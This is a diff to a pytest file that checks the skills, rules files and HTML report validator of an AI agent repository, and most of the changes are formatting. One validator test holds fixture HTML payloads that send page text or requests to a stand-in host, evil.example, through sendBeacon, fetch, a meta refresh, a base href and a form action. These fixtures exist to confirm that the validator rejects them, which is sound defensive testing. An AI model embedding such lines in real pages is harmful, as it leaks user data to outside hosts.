@@ -1,4 +1,5 @@
 """Tests for repository invariants, cross-skill references, and progressive disclosure links."""
+
 import ast
 import os
 from pathlib import Path
@@ -72,7 +73,9 @@ def test_skill_internal_file_references_exist():
 
         skill_file = skill_dir / "SKILL.md"
         content = skill_file.read_text(encoding="utf-8")
-        for match in set(ref_pattern.findall(content) + script_pattern.findall(content)):
+        for match in set(
+            ref_pattern.findall(content) + script_pattern.findall(content)
+        ):
             target_path = skill_dir / match
             assert target_path.exists(), (
                 f"Missing referenced file '{match}' in {skill_file} (expected {target_path})"
@@ -89,6 +92,7 @@ def test_skill_internal_file_references_exist():
 
 def test_python_scripts_complexity_and_safety():
     """Assert all executable Python scripts in skills adhere to indentation and structural budgets."""
+
     def get_max_depth(node: ast.AST, current: int = 0) -> int:
         depths = [current]
         for child in ast.iter_child_nodes(node):
@@ -101,7 +105,9 @@ def test_python_scripts_complexity_and_safety():
     script_files = list(SKILLS_DIR.glob("*/scripts/*.py"))
     assert len(script_files) > 0, "Expected at least one skill python script"
     for script_file in script_files:
-        tree = ast.parse(script_file.read_text(encoding="utf-8"), filename=str(script_file))
+        tree = ast.parse(
+            script_file.read_text(encoding="utf-8"), filename=str(script_file)
+        )
         for node in ast.walk(tree):
             if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                 depth = get_max_depth(node)
@@ -127,16 +133,30 @@ def test_progress_visibility_rule_invariants():
 def test_token_efficiency_adopted_rules_present():
     """Verify AGENTS.md carries the clauses adopted from the token-efficiency repos."""
     rules_text = RULES_FILE.read_text(encoding="utf-8")
-    assert "Adaptive Brevity & Information Density" in rules_text, "rules/AGENTS.md is missing the Adaptive Brevity & Information Density rule"
-    assert "Payload integrity" in rules_text, "Adaptive Brevity is missing the payload-integrity clause"
-    assert "Acceptance Criteria First" in rules_text, "rules/AGENTS.md is missing the Acceptance Criteria First rule"
-    assert "Think in code" in rules_text, "Token & Action Discipline is missing the think-in-code clause"
-    assert "Clean up the orphans your own change created" in rules_text, "Scope Discipline is missing the orphan-cleanup clause"
+    assert "Adaptive Brevity & Information Density" in rules_text, (
+        "rules/AGENTS.md is missing the Adaptive Brevity & Information Density rule"
+    )
+    assert "Payload integrity" in rules_text, (
+        "Adaptive Brevity is missing the payload-integrity clause"
+    )
+    assert "Acceptance Criteria First" in rules_text, (
+        "rules/AGENTS.md is missing the Acceptance Criteria First rule"
+    )
+    assert "Think in code" in rules_text, (
+        "Token & Action Discipline is missing the think-in-code clause"
+    )
+    assert "Clean up the orphans your own change created" in rules_text, (
+        "Scope Discipline is missing the orphan-cleanup clause"
+    )
 
     minimalism_skill = SKILLS_DIR / "code-minimalism" / "SKILL.md"
     skill_text = minimalism_skill.read_text(encoding="utf-8")
-    assert "Equal-size tiebreak" in skill_text, "code-minimalism is missing the equal-size tiebreak"
-    assert "what was skipped or not checked" in skill_text, "code-minimalism is missing the reply disclosure line"
+    assert "Equal-size tiebreak" in skill_text, (
+        "code-minimalism is missing the equal-size tiebreak"
+    )
+    assert "what was skipped or not checked" in skill_text, (
+        "code-minimalism is missing the reply disclosure line"
+    )
 
 
 def test_related_skills_graph_degrees():
@@ -147,7 +167,9 @@ def test_related_skills_graph_degrees():
 
     for name in all_skills:
         content = (SKILLS_DIR / name / "SKILL.md").read_text(encoding="utf-8")
-        assert "## Related Skills" in content, f"{name} has no '## Related Skills' section"
+        assert "## Related Skills" in content, (
+            f"{name} has no '## Related Skills' section"
+        )
         section = content.split("## Related Skills", 1)[1].split("\n## ", 1)[0]
         outgoing[name] = set(ref_pattern.findall(section))
 
@@ -193,20 +215,32 @@ def test_artifact_paths_use_iso_dates():
         "ux-critic",
     ):
         content = (SKILLS_DIR / skill_name / "SKILL.md").read_text(encoding="utf-8")
-        assert "YYYY-MM-DD_" in content, f"{skill_name} does not mandate ISO-dated artifact paths"
+        assert "YYYY-MM-DD_" in content, (
+            f"{skill_name} does not mandate ISO-dated artifact paths"
+        )
 
     spec = (SKILLS_DIR / "spec-driven-design" / "SKILL.md").read_text(encoding="utf-8")
-    assert "docs/designs/YYYY-MM-DD_" in spec, "spec-driven-design must write under docs/designs/"
-    contracts = (SKILLS_DIR / "codebase-contracts" / "SKILL.md").read_text(encoding="utf-8")
+    assert "docs/designs/YYYY-MM-DD_" in spec, (
+        "spec-driven-design must write under docs/designs/"
+    )
+    contracts = (SKILLS_DIR / "codebase-contracts" / "SKILL.md").read_text(
+        encoding="utf-8"
+    )
     assert "docs/reports/YYYY-MM-DD_drift-report_" in contracts
-    review = (SKILLS_DIR / "doubt-driven-development" / "SKILL.md").read_text(encoding="utf-8")
+    review = (SKILLS_DIR / "doubt-driven-development" / "SKILL.md").read_text(
+        encoding="utf-8"
+    )
     assert "docs/reports/YYYY-MM-DD_goldfish-review_" in review
     html_report = (SKILLS_DIR / "html-report" / "SKILL.md").read_text(encoding="utf-8")
     assert "docs/reports/YYYY-MM-DD_" in html_report
     assert ".html" in html_report
-    ux_shape = (SKILLS_DIR / "ux-product-shaper" / "SKILL.md").read_text(encoding="utf-8")
+    ux_shape = (SKILLS_DIR / "ux-product-shaper" / "SKILL.md").read_text(
+        encoding="utf-8"
+    )
     assert "docs/designs/YYYY-MM-DD_product-brief_" in ux_shape
-    design_system = (SKILLS_DIR / "design-system" / "SKILL.md").read_text(encoding="utf-8")
+    design_system = (SKILLS_DIR / "design-system" / "SKILL.md").read_text(
+        encoding="utf-8"
+    )
     assert "docs/designs/YYYY-MM-DD_design-system_" in design_system
     assert "docs/designs/YYYY-MM-DD_tokens_" in design_system
     a11y = (SKILLS_DIR / "ui-accessibility" / "SKILL.md").read_text(encoding="utf-8")
@@ -217,7 +251,13 @@ def test_artifact_paths_use_iso_dates():
 
 def test_no_claude_or_plugin_escape_hatches():
     """Verify the consolidated suite has no Claude-specific or legacy plugin escape hatches."""
-    forbidden = ["CLAUDE_PLUGIN_ROOT", "~/.claude", "$HOME/.claude", "Claude Code", "claude.md"]
+    forbidden = [
+        "CLAUDE_PLUGIN_ROOT",
+        "~/.claude",
+        "$HOME/.claude",
+        "Claude Code",
+        "claude.md",
+    ]
     targets = list(SKILLS_DIR.rglob("*.md")) + [
         RULES_FILE,
         REPO_DIR / "README.md",
@@ -225,22 +265,33 @@ def test_no_claude_or_plugin_escape_hatches():
     for path in targets:
         content = path.read_text(encoding="utf-8")
         for snippet in forbidden:
-            assert snippet not in content, f"Legacy host escape hatch '{snippet}' found in {path}"
+            assert snippet not in content, (
+                f"Legacy host escape hatch '{snippet}' found in {path}"
+            )
 
 
 def test_no_hermes_host_support():
     """Verify Hermes host support and its multi-profile bot specs are fully removed."""
     forbidden = ("hermes", "seven-bots", "seven_bots")
-    targets = [RULES_FILE, REPO_DIR / "README.md", REPO_DIR / "setup.sh", *SKILLS_DIR.rglob("*.md")]
+    targets = [
+        RULES_FILE,
+        REPO_DIR / "README.md",
+        REPO_DIR / "setup.sh",
+        *SKILLS_DIR.rglob("*.md"),
+    ]
     for path in targets:
         content = path.read_text(encoding="utf-8").lower()
         for snippet in forbidden:
-            assert snippet not in content, f"Removed Hermes reference '{snippet}' found in {path}"
+            assert snippet not in content, (
+                f"Removed Hermes reference '{snippet}' found in {path}"
+            )
 
 
 def test_code_review_goldfish_lenses_integrity():
     """Verify the code-review Goldfish reference defines all five personas and is wired in."""
-    reference = SKILLS_DIR / "code-review" / "references" / "goldfish-code-review-lenses.md"
+    reference = (
+        SKILLS_DIR / "code-review" / "references" / "goldfish-code-review-lenses.md"
+    )
     assert reference.exists(), "Missing code-review Goldfish lens reference"
     content = reference.read_text(encoding="utf-8")
 
@@ -274,7 +325,12 @@ def test_code_review_goldfish_lenses_integrity():
 def test_goldfish_persona_lifecycle_and_tiering_invariants():
     """Verify tiering, lifecycle vectors, Security lens, and SOTA research in Goldfish specs."""
     # Doubt-driven-development tiering and schema migration
-    ddd_ref = SKILLS_DIR / "doubt-driven-development" / "references" / "goldfish-review-lenses.md"
+    ddd_ref = (
+        SKILLS_DIR
+        / "doubt-driven-development"
+        / "references"
+        / "goldfish-review-lenses.md"
+    )
     assert ddd_ref.exists()
     ddd_content = ddd_ref.read_text(encoding="utf-8")
     assert "Plan Review Scope Tiering" in ddd_content
@@ -282,12 +338,19 @@ def test_goldfish_persona_lifecycle_and_tiering_invariants():
     assert "Full Architecture Tier" in ddd_content
     assert "data migration & schema safety" in ddd_content
 
-    ddd_skill = (SKILLS_DIR / "doubt-driven-development" / "SKILL.md").read_text(encoding="utf-8")
+    ddd_skill = (SKILLS_DIR / "doubt-driven-development" / "SKILL.md").read_text(
+        encoding="utf-8"
+    )
     assert "Fast Plan Tier" in ddd_skill
     assert "data & schema migration" in ddd_skill
 
     # Spec-driven-design tiering, Security lens, SOTA lens, and arbitration
-    sdd_ref = SKILLS_DIR / "spec-driven-design" / "references" / "spec-templates-and-standards.md"
+    sdd_ref = (
+        SKILLS_DIR
+        / "spec-driven-design"
+        / "references"
+        / "spec-templates-and-standards.md"
+    )
     assert sdd_ref.exists()
     sdd_content = sdd_ref.read_text(encoding="utf-8")
     assert "Risk-Based Brainstorm Tiering" in sdd_content
@@ -296,10 +359,18 @@ def test_goldfish_persona_lifecycle_and_tiering_invariants():
     assert "Lens 7: Security, Privacy & Threat Modeling" in sdd_content
     assert "Specialist Lens: SOTA & Industry Prior-Art" in sdd_content
     assert "Arbitration Precedence Standard" in sdd_content
-    assert "Skill context: spec-driven-design (skills/spec-driven-design/SKILL.md)" in sdd_content
-    assert "Skill context: tech-research (skills/tech-research/SKILL.md), context7-mcp" in sdd_content
+    assert (
+        "Skill context: spec-driven-design (skills/spec-driven-design/SKILL.md)"
+        in sdd_content
+    )
+    assert (
+        "Skill context: tech-research (skills/tech-research/SKILL.md), context7-mcp"
+        in sdd_content
+    )
 
-    sdd_skill = (SKILLS_DIR / "spec-driven-design" / "SKILL.md").read_text(encoding="utf-8")
+    sdd_skill = (SKILLS_DIR / "spec-driven-design" / "SKILL.md").read_text(
+        encoding="utf-8"
+    )
     assert "Security & Threat Modeling" in sdd_skill
     assert "SOTA & Industry Prior-Art" in sdd_skill
     assert "Arbitration Precedence Standard" in sdd_skill
@@ -349,7 +420,9 @@ def _run_validator_path(path: Path) -> subprocess.CompletedProcess[str]:
     )
 
 
-def _run_html_report_validator(tmp_path: Path, content: str) -> subprocess.CompletedProcess[str]:
+def _run_html_report_validator(
+    tmp_path: Path, content: str
+) -> subprocess.CompletedProcess[str]:
     report = tmp_path / "report.html"
     report.write_text(content, encoding="utf-8")
     return _run_validator_path(report)
@@ -369,17 +442,40 @@ def test_html_report_skill_integrity():
 
     assert "references/html-report-scaffold.md" in skill_text
     assert "references/review-gate.md" in skill_text
-    for skill_name in ("technical-reporting", "data-visualization", "ui-accessibility", "ux-critic"):
-        assert f"**{skill_name}**" in skill_text, f"Missing Related Skills handoff to {skill_name}"
+    for skill_name in (
+        "technical-reporting",
+        "data-visualization",
+        "ui-accessibility",
+        "ux-critic",
+    ):
+        assert f"**{skill_name}**" in skill_text, (
+            f"Missing Related Skills handoff to {skill_name}"
+        )
     assert "review gate" in skill_text.lower()
     assert "blocking" in skill_text.lower()
     assert "Exactly one preset" in skill_text
 
-    for marker in ("Visual Quality Bar", "1440x900", "390x844", "320px", "Missing screenshots"):
+    for marker in (
+        "Visual Quality Bar",
+        "1440x900",
+        "390x844",
+        "320px",
+        "Missing screenshots",
+    ):
         assert marker in skill_text, f"Missing blocking gate marker '{marker}'"
-    for marker in ("Hard Fails", "review record", "Do not deliver", "2 cycles", "Render Matrix"):
+    for marker in (
+        "Hard Fails",
+        "review record",
+        "Do not deliver",
+        "2 cycles",
+        "Render Matrix",
+    ):
         assert marker.lower() in gate.lower(), f"Missing review gate detail '{marker}'"
-    for marker in ("Content-Security-Policy", "credential-shaped string", "approved Chart.js exception"):
+    for marker in (
+        "Content-Security-Policy",
+        "credential-shaped string",
+        "approved Chart.js exception",
+    ):
         assert marker.lower() in skill_text.lower() or marker.lower() in gate.lower(), (
             f"Missing CSP/secret/network contract '{marker}'"
         )
@@ -387,18 +483,30 @@ def test_html_report_skill_integrity():
     assert "_review.md" in skill_text
 
     for profile in ("Internal", "Shared", "Print", "Executive"):
-        assert profile in skill_text, f"Missing report review profile '{profile}' in SKILL"
-        assert profile in gate, f"Missing report review profile '{profile}' in review gate"
+        assert profile in skill_text, (
+            f"Missing report review profile '{profile}' in SKILL"
+        )
+        assert profile in gate, (
+            f"Missing report review profile '{profile}' in review gate"
+        )
 
     a11y = (SKILLS_DIR / "ui-accessibility" / "SKILL.md").read_text(encoding="utf-8")
     critic = (SKILLS_DIR / "ux-critic" / "SKILL.md").read_text(encoding="utf-8")
-    assert "**html-report**" in a11y, "ui-accessibility must hand off HTML report review"
+    assert "**html-report**" in a11y, (
+        "ui-accessibility must hand off HTML report review"
+    )
     assert "**html-report**" in critic, "ux-critic must hand off HTML report critique"
-    assert "blocking gate" in a11y.lower(), "ui-accessibility report audit must be blocking"
-    assert "blocking gate" in critic.lower(), "ux-critic report critique must be blocking"
+    assert "blocking gate" in a11y.lower(), (
+        "ui-accessibility report audit must be blocking"
+    )
+    assert "blocking gate" in critic.lower(), (
+        "ux-critic report critique must be blocking"
+    )
 
     for approval_rule in ("explicitly approves", "offline warning", "SRI hash"):
-        assert approval_rule in skill_text, f"Missing controlled CDN rule '{approval_rule}'"
+        assert approval_rule in skill_text, (
+            f"Missing controlled CDN rule '{approval_rule}'"
+        )
     assert "only default network request" in skill_text
     assert "keep the screenshots" in gate.lower()
 
@@ -425,19 +533,42 @@ def test_html_report_scaffold_integrity():
         "display=swap",
     ):
         assert marker in scaffold, f"Missing scaffold marker '{marker}'"
-    for marker in ("Structural Self-Check", "check_html_report.py", "Render Evidence", "Review Record"):
+    for marker in (
+        "Structural Self-Check",
+        "check_html_report.py",
+        "Render Evidence",
+        "Review Record",
+    ):
         assert marker in scaffold, f"Missing scaffold workflow marker '{marker}'"
-    for preset in ('data-preset="dossier"', 'data-preset="zen-garden"', 'data-preset="chronicle"'):
+    for preset in (
+        'data-preset="dossier"',
+        'data-preset="zen-garden"',
+        'data-preset="chronicle"',
+    ):
         assert preset in scaffold, f"Missing scaffold preset '{preset}'"
-    for removed in ("preset-btn", "preset-group", "expand-all", "collapse-all", "copy-summary"):
-        assert removed not in scaffold, f"Scaffold still contains redundant control '{removed}'"
+    for removed in (
+        "preset-btn",
+        "preset-group",
+        "expand-all",
+        "collapse-all",
+        "copy-summary",
+    ):
+        assert removed not in scaffold, (
+            f"Scaffold still contains redundant control '{removed}'"
+        )
     assert 'id="theme-toggle"' in scaffold, "Scaffold must keep one theme toggle"
     assert "0.72rem" not in scaffold and "0.7rem" not in scaffold, (
         "Scaffold still uses label sizes below the 0.75rem minimum"
     )
-    assert "REPLACE_WITH" not in scaffold, "Scaffold still contains an unresolved SRI placeholder"
-    assert "#878079" in scaffold, "Scaffold context series must use the 3:1 warm stone token"
-    assert "--chart-ps: #4A6B53" not in scaffold, "Zen Garden charts must use the shared warm palette"
+    assert "REPLACE_WITH" not in scaffold, (
+        "Scaffold still contains an unresolved SRI placeholder"
+    )
+    assert "#878079" in scaffold, (
+        "Scaffold context series must use the 3:1 warm stone token"
+    )
+    assert "--chart-ps: #4A6B53" not in scaffold, (
+        "Zen Garden charts must use the shared warm palette"
+    )
     assert "keep the screenshots" in scaffold.lower()
 
     for emoji in ("❌", "✅", "⚠️", "🚀"):
@@ -500,17 +631,19 @@ def test_html_report_validator_rejects_event_and_url_vectors(tmp_path):
             'navigator.sendBeacon("https://evil.example", document.body.innerText)',
         ),
         "meta_refresh": HTML_REPORT_FIXTURE.replace(
-            "</head>", '<meta http-equiv="refresh" content="0;url=https://evil.example/"></head>'
+            "</head>",
+            '<meta http-equiv="refresh" content="0;url=https://evil.example/"></head>',
         ),
         "base_href": HTML_REPORT_FIXTURE.replace(
             "</head>", '<base href="https://evil.example/"></head>'
         ),
         "javascript_href": HTML_REPORT_FIXTURE.replace(
             "<h1>Report</h1>",
-            '<h1>Report</h1><a href="javascript:fetch(\'https://evil.example\')">x</a>',
+            "<h1>Report</h1><a href=\"javascript:fetch('https://evil.example')\">x</a>",
         ),
         "form_action": HTML_REPORT_FIXTURE.replace(
-            "<h1>Report</h1>", '<h1>Report</h1><form action="https://evil.example/"></form>'
+            "<h1>Report</h1>",
+            '<h1>Report</h1><form action="https://evil.example/"></form>',
         ),
         "poster": HTML_REPORT_FIXTURE.replace(
             "<h1>Report</h1>",
@@ -522,7 +655,11 @@ def test_html_report_validator_rejects_event_and_url_vectors(tmp_path):
         assert result.returncode == 1, f"{name} passed: {result.stdout}"
         assert any(
             marker in result.stdout
-            for marker in ("inline event handlers", "external or sidecar assets", "inline script network calls")
+            for marker in (
+                "inline event handlers",
+                "external or sidecar assets",
+                "inline script network calls",
+            )
         ), f"{name} produced an unexpected failure: {result.stdout}"
 
 
@@ -565,11 +702,14 @@ def test_html_report_validator_css_and_preset_parsing(tmp_path):
     assert result.returncode == 0, result.stdout
 
     no_token = HTML_REPORT_FIXTURE.replace(
-        ':root, :root[data-preset="dossier"] {', ':root {'
+        ':root, :root[data-preset="dossier"] {', ":root {"
     ).replace('data-preset="dossier"', 'data-preset="chronicle"')
     result = _run_html_report_validator(tmp_path, no_token)
     assert result.returncode == 1
-    assert "missing preset token block" in result.stdout or "missing token block for chosen preset" in result.stdout
+    assert (
+        "missing preset token block" in result.stdout
+        or "missing token block for chosen preset" in result.stdout
+    )
 
 
 def test_html_report_validator_rejects_secrets(tmp_path):
@@ -617,9 +757,9 @@ def test_html_report_validator_csp_and_chart_exception(tmp_path):
 
 def test_html_report_review_evidence_retention():
     """The review record and scaffold agree that linked screenshots are retained."""
-    gate = (
-        SKILLS_DIR / "html-report" / "references" / "review-gate.md"
-    ).read_text(encoding="utf-8")
+    gate = (SKILLS_DIR / "html-report" / "references" / "review-gate.md").read_text(
+        encoding="utf-8"
+    )
     scaffold = (
         SKILLS_DIR / "html-report" / "references" / "html-report-scaffold.md"
     ).read_text(encoding="utf-8")
@@ -633,19 +773,52 @@ def test_ui_ux_family_integrity():
     family = {
         "ux-product-shaper": (
             "product-and-state-contracts.md",
-            ("Surface Mode", "8-State", "PRODUCT.md", "docs/designs/", "YAGNI", "Minimalist Register", "NOT Building"),
+            (
+                "Surface Mode",
+                "8-State",
+                "PRODUCT.md",
+                "docs/designs/",
+                "YAGNI",
+                "Minimalist Register",
+                "NOT Building",
+            ),
         ),
         "design-system": (
             "token-and-component-specs.md",
-            ("W3C DTCG", "tokens.css", "html-report", "plotly-dash", "Monochrome", "1 Accent", "Rule of Three", "20-25"),
+            (
+                "W3C DTCG",
+                "tokens.css",
+                "html-report",
+                "plotly-dash",
+                "Monochrome",
+                "1 Accent",
+                "Rule of Three",
+                "20-25",
+            ),
         ),
         "ui-accessibility": (
             "wcag-2-2-audit.md",
-            ("WCAG 2.2", "keyboard", "code-review", "verify-and-stop", "False Minimalism", "Clickability"),
+            (
+                "WCAG 2.2",
+                "keyboard",
+                "code-review",
+                "verify-and-stop",
+                "False Minimalism",
+                "Clickability",
+            ),
         ),
         "ux-critic": (
             "heuristic-critique.md",
-            ("Nielsen", "squint", "doubt-driven-development", "docs/reports/", "Dieter Rams", "Subtraction", "THE ONE DELETION", "YAGNI"),
+            (
+                "Nielsen",
+                "squint",
+                "doubt-driven-development",
+                "docs/reports/",
+                "Dieter Rams",
+                "Subtraction",
+                "THE ONE DELETION",
+                "YAGNI",
+            ),
         ),
     }
 
@@ -657,35 +830,56 @@ def test_ui_ux_family_integrity():
 
         skill_text = skill_file.read_text(encoding="utf-8")
         ref_text = reference.read_text(encoding="utf-8")
-        assert f"references/{ref_name}" in skill_text, f"{name} does not link its reference"
+        assert f"references/{ref_name}" in skill_text, (
+            f"{name} does not link its reference"
+        )
 
         for marker in markers:
-            assert marker in skill_text or marker in ref_text, f"Missing '{marker}' in {name}"
+            assert marker in skill_text or marker in ref_text, (
+                f"Missing '{marker}' in {name}"
+            )
 
         for emoji in ("❌", "✅", "⚠️", "🚀"):
             assert emoji not in skill_text, f"Forbidden emoji '{emoji}' in {skill_file}"
             assert emoji not in ref_text, f"Forbidden emoji '{emoji}' in {reference}"
 
-    shaper_skill = (SKILLS_DIR / "ux-product-shaper" / "SKILL.md").read_text(encoding="utf-8")
+    shaper_skill = (SKILLS_DIR / "ux-product-shaper" / "SKILL.md").read_text(
+        encoding="utf-8"
+    )
     shaper_ref = (
-        SKILLS_DIR / "ux-product-shaper" / "references" / "product-and-state-contracts.md"
+        SKILLS_DIR
+        / "ux-product-shaper"
+        / "references"
+        / "product-and-state-contracts.md"
     ).read_text(encoding="utf-8")
-    assert "4-6" not in shaper_skill, "ux-product-shaper reintroduced the 4-6 navigation cap"
-    assert "4 numbered items" in shaper_skill, "ux-product-shaper must cap navigation at 4 items"
+    assert "4-6" not in shaper_skill, (
+        "ux-product-shaper reintroduced the 4-6 navigation cap"
+    )
+    assert "4 numbered items" in shaper_skill, (
+        "ux-product-shaper must cap navigation at 4 items"
+    )
     assert "At most 4 top-level navigation items." in shaper_ref, (
         "ux-product-shaper reference must agree on the 4-item navigation cap"
     )
     assert "2.5x-3x" in shaper_skill and "3x+" in shaper_skill, (
         "ux-product-shaper must separate page-title and KPI hero sizes"
     )
-    assert "2.5x-3x" in shaper_ref, "ux-product-shaper reference must mirror the hero-size rule"
+    assert "2.5x-3x" in shaper_ref, (
+        "ux-product-shaper reference must mirror the hero-size rule"
+    )
 
     ds_ref = (
         SKILLS_DIR / "design-system" / "references" / "token-and-component-specs.md"
     ).read_text(encoding="utf-8")
-    assert "2 primary font families" in ds_ref, "design-system reference must allow 2 primary families"
-    assert "monospace data face" in ds_ref, "design-system reference must name the monospace data face"
-    assert "400/600 contrast" not in ds_ref, "design-system reference still carries the old weight doctrine"
+    assert "2 primary font families" in ds_ref, (
+        "design-system reference must allow 2 primary families"
+    )
+    assert "monospace data face" in ds_ref, (
+        "design-system reference must name the monospace data face"
+    )
+    assert "400/600 contrast" not in ds_ref, (
+        "design-system reference still carries the old weight doctrine"
+    )
     assert "editorial report roles" in ds_ref or "9 editorial" in ds_ref, (
         "design-system reference must document the editorial report roles"
     )
@@ -715,19 +909,33 @@ def test_typography_contract_consistency():
         SKILLS_DIR / "html-report" / "references" / "html-report-scaffold.md"
     ).read_text(encoding="utf-8")
 
-    for text, name in ((ds_skill, "design-system"), (ds_ref, "design-system reference"), (hr_skill, "html-report")):
+    for text, name in (
+        (ds_skill, "design-system"),
+        (ds_ref, "design-system reference"),
+        (hr_skill, "html-report"),
+    ):
         assert "60ch-70ch" in text, f"{name} does not declare the 60ch-70ch measure"
-        assert "60ch-68ch" not in text, f"{name} still carries the stale 60ch-68ch measure"
+        assert "60ch-68ch" not in text, (
+            f"{name} still carries the stale 60ch-68ch measure"
+        )
 
     for minimum in ("0.9375rem", "0.75rem", "0.82rem"):
-        assert minimum in hr_skill, f"html-report does not declare the {minimum} minimum"
+        assert minimum in hr_skill, (
+            f"html-report does not declare the {minimum} minimum"
+        )
 
     assert "font-optical-sizing" in scaffold, "Scaffold does not enable optical sizing"
-    for family in ("Fraunces", "Cormorant Garamond", "Plus Jakarta Sans", "Inter", "JetBrains Mono"):
+    for family in (
+        "Fraunces",
+        "Cormorant Garamond",
+        "Plus Jakarta Sans",
+        "Inter",
+        "JetBrains Mono",
+    ):
         assert family in scaffold, f"Scaffold does not load '{family}'"
 
     zen_start = scaffold.index(':root[data-preset="zen-garden"] {')
-    zen_block = scaffold[zen_start:scaffold.index("}", zen_start)]
+    zen_block = scaffold[zen_start : scaffold.index("}", zen_start)]
     for token in (
         "--chart-ps: #9E583B",
         "--chart-prod: #5A5550",
@@ -736,7 +944,9 @@ def test_typography_contract_consistency():
         "--chart-neg: #992B2B",
     ):
         assert token in zen_block, f"Zen Garden chart palette is missing '{token}'"
-    assert "--chart-ps: #4A6B53" not in zen_block, "Zen Garden charts must not use the moss accent"
+    assert "--chart-ps: #4A6B53" not in zen_block, (
+        "Zen Garden charts must not use the moss accent"
+    )
     assert "--accent: #4A6B53" in zen_block, "Zen Garden must keep moss for UI chrome"
 
 
@@ -747,7 +957,12 @@ def test_html_report_chart_interaction_contract():
         SKILLS_DIR / "html-report" / "references" / "html-report-scaffold.md"
     ).read_text(encoding="utf-8")
 
-    for marker in ("Chart Interaction Contract", "cross-highlight", "two decimals", 'role="group"'):
+    for marker in (
+        "Chart Interaction Contract",
+        "cross-highlight",
+        "two decimals",
+        'role="group"',
+    ):
         assert marker in skill, f"html-report SKILL is missing '{marker}'"
 
     for marker in (
@@ -758,11 +973,17 @@ def test_html_report_chart_interaction_contract():
         'pointer-events="none"',
         "prefers-reduced-motion",
     ):
-        assert marker in scaffold, f"Scaffold is missing chart interaction marker '{marker}'"
+        assert marker in scaffold, (
+            f"Scaffold is missing chart interaction marker '{marker}'"
+        )
 
     dv = (SKILLS_DIR / "data-visualization" / "SKILL.md").read_text(encoding="utf-8")
-    assert "two decimals" in dv, "data-visualization must require two-decimal percent labels"
-    assert "counts use `k`/`M`" in dv, "data-visualization must require abbreviated counts"
+    assert "two decimals" in dv, (
+        "data-visualization must require two-decimal percent labels"
+    )
+    assert "counts use `k`/`M`" in dv, (
+        "data-visualization must require abbreviated counts"
+    )
 
     a11y = (SKILLS_DIR / "ui-accessibility" / "SKILL.md").read_text(encoding="utf-8")
     assert "Chart marks are keyboard reachable" in a11y, (
@@ -782,11 +1003,15 @@ def test_numeric_contracts_are_canonical():
     assert "spec/design review `<= 3`" in rules
     assert "hard finding `> 50`" in rules
 
-    code_minimalism = (SKILLS_DIR / "code-minimalism" / "SKILL.md").read_text(encoding="utf-8")
+    code_minimalism = (SKILLS_DIR / "code-minimalism" / "SKILL.md").read_text(
+        encoding="utf-8"
+    )
     assert "Follow `rules/AGENTS.md` §3" in code_minimalism
     assert "> 40 LOC" not in code_minimalism
 
-    doubt = (SKILLS_DIR / "doubt-driven-development" / "SKILL.md").read_text(encoding="utf-8")
+    doubt = (SKILLS_DIR / "doubt-driven-development" / "SKILL.md").read_text(
+        encoding="utf-8"
+    )
     assert "spec/design review bound in `rules/AGENTS.md` §1" in doubt
     for stale in ("three review cycles", "3 unresolved cycles", "at most three"):
         assert stale not in doubt
@@ -803,7 +1028,9 @@ def test_numeric_contracts_are_canonical():
     assert "two fix-review cycles" not in review_ref
     assert "50 effective lines" not in review_ref
 
-    simplification = (SKILLS_DIR / "code-simplification" / "SKILL.md").read_text(encoding="utf-8")
+    simplification = (SKILLS_DIR / "code-simplification" / "SKILL.md").read_text(
+        encoding="utf-8"
+    )
     assert "hard length threshold in `rules/AGENTS.md` §3" in simplification
     assert "<= 50 effective lines" not in simplification
 
@@ -848,8 +1075,8 @@ def test_deprecation_probe_uses_safe_tempdir():
     ).read_text(encoding="utf-8")
     assert "mktemp -d" in reference
     assert "trap 'rm -rf -- \"$probe\"' EXIT" in reference
-    assert "case \"$target\" in" in reference
-    assert "rm -rf -- \"$probe/$target\"" in reference
+    assert 'case "$target" in' in reference
+    assert 'rm -rf -- "$probe/$target"' in reference
     assert "/tmp/clone_probe" not in reference
 
 
@@ -868,6 +1095,7 @@ def test_readme_reference_counts_match_directories():
         "html-report": 2,
         "python-pro": 1,
         "python-testing": 2,
+        "precommit-initialization": 4,
         "spec-driven-design": 1,
         "ui-accessibility": 1,
         "ux-critic": 1,
@@ -884,7 +1112,11 @@ def test_readme_reference_counts_match_directories():
     }
     for name, count in expected.items():
         line = next(
-            (line for line in readme.splitlines() if f"{name}/" in line and "(+" in line),
+            (
+                line
+                for line in readme.splitlines()
+                if f"{name}/" in line and "(+" in line
+            ),
             "",
         )
         match = re.search(r"\(\+ (\d+) references?", line)
@@ -892,7 +1124,9 @@ def test_readme_reference_counts_match_directories():
         assert int(match.group(1)) == count, (
             f"README annotation for {name} is {match.group(1)}, expected {count}"
         )
-        actual = len([f for f in (SKILLS_DIR / name / "references").iterdir() if f.is_file()])
+        actual = len(
+            [f for f in (SKILLS_DIR / name / "references").iterdir() if f.is_file()]
+        )
         assert actual == count, f"{name} has {actual} references, expected {count}"
     assert "`AGENTS.md` §5 stub" not in readme
 
@@ -935,19 +1169,33 @@ def test_dispatch_contracts_include_skill_context():
     assert "owning review skill or persona card" in rules
 
     references = (
-        SKILLS_DIR / "spec-driven-design" / "references" / "spec-templates-and-standards.md",
+        SKILLS_DIR
+        / "spec-driven-design"
+        / "references"
+        / "spec-templates-and-standards.md",
         SKILLS_DIR / "code-review" / "references" / "goldfish-code-review-lenses.md",
-        SKILLS_DIR / "doubt-driven-development" / "references" / "goldfish-review-lenses.md",
+        SKILLS_DIR
+        / "doubt-driven-development"
+        / "references"
+        / "goldfish-review-lenses.md",
     )
     for path in references:
         content = path.read_text(encoding="utf-8")
-        assert "Skill context:" in content, f"{path} is missing the Skill context handoff"
+        assert "Skill context:" in content, (
+            f"{path} is missing the Skill context handoff"
+        )
         assert "SKILL.md" in content, f"{path} must name the SKILL.md path"
 
 
 def test_rules_file_discovery_rule_present():
     """The global rules require reading AGENTS.md and writing rules only to AGENTS.md."""
     rules = RULES_FILE.read_text(encoding="utf-8")
-    assert "Rules File Discovery" in rules, "rules/AGENTS.md is missing the Rules File Discovery rule"
-    assert "Single Rules File" in rules, "rules/AGENTS.md is missing the Single Rules File rule"
-    assert "repository rules file path" in rules, "Context Economy must pass the rules file path to subagents"
+    assert "Rules File Discovery" in rules, (
+        "rules/AGENTS.md is missing the Rules File Discovery rule"
+    )
+    assert "Single Rules File" in rules, (
+        "rules/AGENTS.md is missing the Single Rules File rule"
+    )
+    assert "repository rules file path" in rules, (
+        "Context Economy must pass the rules file path to subagents"
+    )
